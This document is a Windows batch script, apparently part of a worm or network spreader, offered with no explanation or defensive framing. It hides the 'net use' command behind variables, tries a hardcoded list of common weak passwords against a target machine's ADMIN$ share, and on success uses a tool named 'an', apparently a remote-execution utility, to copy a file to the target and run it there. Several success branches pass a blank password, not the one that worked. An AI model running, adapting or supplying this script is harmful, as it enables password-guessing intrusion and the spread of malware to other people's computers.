@echo off
set D=u
set E=s
set F=e
net %D%%E%%F% \\%1\ADMIN$ "roben" /user:administrator
if NOT errorlevEl 1 goto zx40
net %D%%E%%F% \\%1\ADMIN$ "gems" /user:administrator
if NOT errorlevEl 1 goto zx41
net %D%%E%%F% \\%1\ADMIN$ "shop" /user:administrator
if NOT errorlevEl 1 goto zx42
net %D%%E%%F% \\%1\ADMIN$ "server" /user:administrator
if NOT errorlevEl 1 goto zx43
net %D%%E%%F% \\%1\ADMIN$ "xxyyzz" /user:administrator
if NOT errorlevEl 1 goto zx29
net %D%%E%%F% \\%1\ADMIN$ "abc" /user:administrator
if NOT errorlevEl 1 goto zx30
net %D%%E%%F% \\%1\ADMIN$ "student" /user:student
if NOT errorlevEl 1 goto zx31
net %D%%E%%F% \\%1\ADMIN$ "teacher" /user:teacher
if NOT errorlevEl 1 goto zx32
net %D%%E%%F% \\%1\ADMIN$ "" /user:user
if NOT errorlevEl 1 goto zx33
net %D%%E%%F% \\%1\ADMIN$ "user" /user:user
if NOT errorlevEl 1 goto zx34
net %D%%E%%F% \\%1\ADMIN$ "test" /user:test
if NOT errorlevEl 1 goto zx4
net %D%%E%%F% \\%1\ADMIN$ "test123" /user:administrator
if NOT errorlevEl 1 goto zx5
net %D%%E%%F% \\%1\ADMIN$ "1" /user:administrator
if NOT errorlevEl 1 goto zx26
net %D%%E%%F% \\%1\ADMIN$ "123" /user:administrator
if NOT errorlevEl 1 goto zx27
net %D%%E%%F% \\%1\ADMIN$ "12345" /user:admin
if NOT errorlevEl 1 goto zx28
net %D%%E%%F% \\%1\ADMIN$ "temp" /user:administrator
if NOT errorlevEl 1 goto zx6
net %D%%E%%F% \\%1\ADMIN$ "" /user:administrator
if NOT errorlevEl 1 goto zx1
net %D%%E%%F% \\%1\ADMIN$ "" /user:administrator
if NOT errorlevEl 1 goto zx35
net %D%%E%%F% \\%1\ADMIN$ "Administrator" /user:administrator
if NOT errorlevEl 1 goto zx2
net %D%%E%%F% \\%1\ADMIN$ "Administrator" /user:administrator
if NOT errorlevEl 1 goto zx37
net %D%%E%%F% \\%1\ADMIN$ "test" /user:administrator
if NOT errorlevEl 1 goto zx3
net %D%%E%%F% \\%1\ADMIN$ "admin" /user:administrator
if NOT errorlevEl 1 goto zx10
net %D%%E%%F% \\%1\ADMIN$ "temp123" /user:administrator
if NOT errorlevEl 1 goto zx7
net %D%%E%%F% \\%1\ADMIN$ "pass" /user:administrator
if NOT errorlevEl 1 goto zx8
net %D%%E%%F% \\%1\ADMIN$ "password" /user:administrator
if NOT errorlevEl 1 goto zx9
net %D%%E%%F% \\%1\ADMIN$ "root" /user:root
if NOT errorlevEl 1 goto zx11
net %D%%E%%F% \\%1\ADMIN$ "changeme" /user:administrator
if NOT errorlevEl 1 goto zx12
net %D%%E%%F% \\%1\ADMIN$ "admin" /user:admin
if NOT errorlevEl 1 goto zx13
net %D%%E%%F% \\%1\ADMIN$ "123456" /user:administrator
if NOT errorlevEl 1 goto zx14
net %D%%E%%F% \\%1\ADMIN$ "654321" /user:administrator
if NOT errorlevEl 1 goto zx15
net %D%%E%%F% \\%1\ADMIN$ "abc123" /user:administrator
if NOT errorlevEl 1 goto zx16
net %D%%E%%F% \\%1\ADMIN$ "12345" /user:administrator
if NOT errorlevEl 1 goto zx36
net %D%%E%%F% \\%1\ADMIN$ "red123" /user:administrator
if NOT errorlevEl 1 goto zx17
net %D%%E%%F% \\%1\ADMIN$ "admin123" /user:administrator
if NOT errorlevEl 1 goto zx18
net %D%%E%%F% \\%1\ADMIN$ "qwerty" /user:administrator
if NOT errorlevEl 1 goto zx19
net %D%%E%%F% \\%1\ADMIN$ "asdf" /user:administrator
if NOT errorlevEl 1 goto zx20
net %D%%E%%F% \\%1\ADMIN$ "password123" /user:administrator
if NOT errorlevEl 1 goto zx21
net %D%%E%%F% \\%1\ADMIN$ "secret" /user:administrator
if NOT errorlevEl 1 goto zx22
net %D%%E%%F% \\%1\ADMIN$ "qwertyuiop" /user:administrator
if NOT errorlevEl 1 goto zx23
net %D%%E%%F% \\%1\ADMIN$ "12345" /user:administrator
if NOT errorlevEl 1 goto zx24
net %D%%E%%F% \\%1\ADMIN$ "54321" /user:administrator
if NOT errorlevEl 1 goto zx25
goto zannd
:zx1
an \\%1 -u administrator -p "" -d attrib.ean -r %2
an \\%1 -u administrator -p "" -f -c -d %2 -o
an \\%1 -u administrator -p "" -d %2 -o
goto zannd
:zx10
an \\%1 -u administrator -p "admin" -d attrib.ean -r %2
an \\%1 -u administrator -p "admin" -f -c -d %2 -o
an \\%1 -u administrator -p "admin" -d %2 -o
goto zannd
:zx2
an \\%1 -u administrator -p "administrator" -d attrib.ean -r %2
an \\%1 -u administrator -p "administrator" -f -c -d %2 -o
an \\%1 -u administrator -p "administrator" -d %2 -o
goto zannd
:zx37
an \\%1 -u administrator -p "Administrator" -d attrib.ean -r %2
an \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
an \\%1 -u administrator -p "Administrator" -d %2 -o
goto zannd
:zx11
an \\%1 -u root -p "root" -d attrib.ean -r %2
an \\%1 -u root -p "root" -f -c -d %2 -o
an \\%1 -u root -p "root" -d %2 -o
goto zannd
:zx13
an \\%1 -u admin -p "admin" -d attrib.ean -r %2
an \\%1 -u admin -p "admin" -f -c -d %2 -o
an \\%1 -u admin -p "admin" -d %2 -o
goto zannd
:zx3
an \\%1 -u administrator -p "test" -d attrib.ean -r %2
an \\%1 -u administrator -p "test" -f -c -d %2 -o
an \\%1 -u administrator -p "test" -d %2 -o
goto zannd
:zx4
an \\%1 -u test -p "test" -d attrib.ean -r %2
an \\%1 -u test -p "test" -f -c -d %2 -o
an \\%1 -u test -p "test" -d %2 -o
goto zannd
:zx5
an \\%1 -u administrator -p "test123" -d attrib.ean -r %2
an \\%1 -u administrator -p "test123" -f -c -d %2 -o
an \\%1 -u administrator -p "test123" -d %2 -o
goto zannd
:zx6
an \\%1 -u administrator -p "temp" -d attrib.ean -r %2
an \\%1 -u administrator -p "temp" -f -c -d %2 -o
an \\%1 -u administrator -p "temp" -d %2 -o
goto zannd
:zx7
an \\%1 -u administrator -p "temp123" -d attrib.ean -r %2
an \\%1 -u administrator -p "temp123" -f -c -d %2 -o
an \\%1 -u administrator -p "temp123" -d %2 -o
goto zannd
:zx8
an \\%1 -u administrator -p "pass" -d attrib.ean -r %2
an \\%1 -u administrator -p "pass" -f -c -d %2 -o
an \\%1 -u administrator -p "pass" -d %2 -o
goto zannd
:zx9
an \\%1 -u administrator -p "password" -d attrib.ean -r %2
an \\%1 -u administrator -p "password" -f -c -d %2 -o
an \\%1 -u administrator -p "password" -d %2 -o
goto zannd
:zx12
an \\%1 -u administrator -p "changeme" -d attrib.ean -r %2
an \\%1 -u administrator -p "changeme" -f -c -d %2 -o
an \\%1 -u administrator -p "changeme" -d %2 -o
goto zannd
:zx14
an \\%1 -u administrator -p "123456" -d attrib.ean -r %2
an \\%1 -u administrator -p "123456" -f -c -d %2 -o
an \\%1 -u administrator -p "123456" -d %2 -o
goto zannd
:zx15
an \\%1 -u administrator -p "654321" -d attrib.ean -r %2
an \\%1 -u administrator -p "654321" -f -c -d %2 -o
an \\%1 -u administrator -p "654321" -d %2 -o
goto zannd
:zx16
an \\%1 -u administrator -p "abc123" -d attrib.ean -r %2
an \\%1 -u administrator -p "abc123" -f -c -d %2 -o
an \\%1 -u administrator -p "abc123" -d %2 -o
goto zannd
:zx17
an \\%1 -u administrator -p "red123" -d attrib.ean -r %2
an \\%1 -u administrator -p "red123" -f -c -d %2 -o
an \\%1 -u administrator -p "red123" -d %2 -o
goto zannd
:zx18
an \\%1 -u administrator -p "admin123" -d attrib.ean -r %2
an \\%1 -u administrator -p "admin123" -f -c -d %2 -o
an \\%1 -u administrator -p "admin123" -d %2 -o
goto zannd
:zx19
an \\%1 -u administrator -p "qwerty" -d attrib.ean -r %2
an \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
an \\%1 -u administrator -p "qwerty" -d %2 -o
goto zannd
:zx20
an \\%1 -u administrator -p "asdf" -d attrib.ean -r %2
an \\%1 -u administrator -p "asdf" -f -c -d %2 -o
an \\%1 -u administrator -p "asdf" -d %2 -o
goto zannd
:zx21
an \\%1 -u administrator -p "password123" -d attrib.ean -r %2
an \\%1 -u administrator -p "password123" -f -c -d %2 -o
an \\%1 -u administrator -p "password123" -d %2 -o
goto zannd
:zx22
an \\%1 -u administrator -p "secret" -d attrib.ean -r %2
an \\%1 -u administrator -p "secret" -f -c -d %2 -o
an \\%1 -u administrator -p "secret" -d %2 -o
goto zannd
:zx23
an \\%1 -u administrator -p "qwertyuiop" -d attrib.ean -r %2
an \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
an \\%1 -u administrator -p "qwertyuiop" -d %2 -o
goto zannd
:zx24
an \\%1 -u administrator -p "12345" -d attrib.ean -r %2
an \\%1 -u administrator -p "12345" -f -c -d %2 -o
an \\%1 -u administrator -p "12345" -d %2 -o
goto zannd
:zx25
an \\%1 -u administrator -p "54321" -d attrib.ean -r %2
an \\%1 -u administrator -p "54321" -f -c -d %2 -o
an \\%1 -u administrator -p "54321" -d %2 -o
goto zannd
:zx26
an \\%1 -u administrator -p "1" -d attrib.ean -r %2
an \\%1 -u administrator -p "1" -f -c -d %2 -o
an \\%1 -u administrator -p "1" -d %2 -o
goto zannd
:zx27
an \\%1 -u administrator -p "123" -d attrib.ean -r %2
an \\%1 -u administrator -p "123" -f -c -d %2 -o
an \\%1 -u administrator -p "123" -d %2 -o
goto zannd
:zx28
an \\%1 -u admin -p "12345" -d attrib.ean -r %2
an \\%1 -u admin -p "12345" -f -c -d %2 -o
an \\%1 -u admin -p "12345" -d %2 -o
goto zannd
:zx29
an \\%1 -u administrator -p "xxyyzz" -d attrib.ean -r %2
an \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
an \\%1 -u administrator -p "xxyyzz" -d %2 -o
goto zannd
:zx30
an \\%1 -u administrator -p "abc" -d attrib.ean -r %2
an \\%1 -u administrator -p "abc" -f -c -d %2 -o
an \\%1 -u administrator -p "abc" -d %2 -o
goto zannd
:zx31
an \\%1 -u student -p "student" -d attrib.ean -r %2
an \\%1 -u student -p "student" -f -c -d %2 -o
an \\%1 -u student -p "student" -d %2 -o
goto zannd
:zx32
an \\%1 -u teacher -p "teacher" -d attrib.ean -r %2
an \\%1 -u teacher -p "teacher" -f -c -d %2 -o
an \\%1 -u teacher -p "teacher" -d %2 -o
goto zannd
:zx33
an \\%1 -u user -p "" -d attrib.ean -r %2
an \\%1 -u user -p "" -f -c -d %2 -o
an \\%1 -u user -p "" -d %2 -o
goto zannd
:zx34
an \\%1 -u user -p "user" -d attrib.ean -r %2
an \\%1 -u user -p "user" -f -c -d %2 -o
an \\%1 -u user -p "user" -d %2 -o
goto zannd
:zx35
an \\%1 -u administrator -p "" -d attrib.ean -r %2
an \\%1 -u administrator -p "" -f -c -d %2 -o
an \\%1 -u administrator -p "" -d %2 -o
goto zannd
:zx36
an \\%1 -u administrator -p "12345" -d attrib.ean -r %2
an \\%1 -u administrator -p "12345" -f -c -d %2 -o
an \\%1 -u administrator -p "12345" -d %2 -o
goto zannd
:zx40
an \\%1 -u administrator -p "" -d attrib.ean -r %2
an \\%1 -u administrator -p "" -f -c -d %2 -o
an \\%1 -u administrator -p "" -d %2 -o
goto zannd
:zx41
an \\%1 -u administrator -p "" -d attrib.ean -r %2
an \\%1 -u administrator -p "" -f -c -d %2 -o
an \\%1 -u administrator -p "" -d %2 -o
goto zannd
:zx42
an \\%1 -u administrator -p "" -d attrib.ean -r %2
an \\%1 -u administrator -p "" -f -c -d %2 -o
an \\%1 -u administrator -p "" -d %2 -o
goto zannd
:zx43
an \\%1 -u administrator -p "" -d attrib.ean -r %2
an \\%1 -u administrator -p "" -f -c -d %2 -o
an \\%1 -u administrator -p "" -d %2 -o
goto zannd
:zannd